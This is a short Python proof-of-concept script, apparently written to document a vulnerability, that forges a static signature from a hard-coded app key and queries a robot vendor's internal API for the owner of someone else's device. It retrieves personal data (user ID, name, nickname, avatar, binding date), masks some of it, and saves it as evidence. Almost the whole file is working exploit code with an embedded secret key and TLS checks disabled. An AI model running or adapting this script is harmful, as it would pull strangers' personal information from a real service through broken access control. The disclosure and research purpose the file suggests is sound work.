# -*- coding: utf-8 -*-
# capture_getbindusers.py — 抓取 SN→机主PII 证据（脱敏存档）
import hashlib, time, urllib3, requests, uuid, json, os
urllib3.disable_warnings()
APP_ID = '100020114'
APP_KEY = 'b4e01f307c614ded9f7ac59cf9960874'
dev = 'sigvoidprobe0001'
ts = str(int(time.time())); nonce = uuid.uuid4().hex[:8]
sign = f"{hashlib.md5((ts + APP_KEY + nonce + dev).encode()).hexdigest()} {ts} {nonce} v2"
h = {'X-UBT-AppId': APP_ID, 'X-UBT-DeviceId': dev, 'X-UBT-Sign': sign}
r = requests.get('https://internal.ubtrobot.com/v1/minieducn/relation/getBindUsers',
                 headers=h, params={'robotUserId': '<其他机器人设备_01>'}, timeout=15, verify=False)
j = r.json()
u = j['data']['result'][0]
redacted = {
    'http_status': r.status_code,
    'auth': '仅静态 X-UBT 签名，无 authorization token',
    'request': 'GET https://internal.ubtrobot.com/v1/minieducn/relation/getBindUsers?robotUserId=<其他机器人设备_01>',
    'owner_leak': {
        'userId': u.get('userId'),
        'userName': (u.get('userName') or '')[:6] + '****',
        'nickName': (u.get('nickName') or '')[:1] + '**',
        'userImage': (u.get('userImage') or '')[:60] + '...(微信头像URL,已截断)',
        'relationDate': u.get('relationDate'),
        'upUser': u.get('upUser'),
    },
}
out = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'relation_getBindUsers_redacted.json')
json.dump(redacted, open(out, 'w', encoding='utf-8'), ensure_ascii=False, indent=2)
print(json.dumps(redacted, ensure_ascii=False, indent=2))
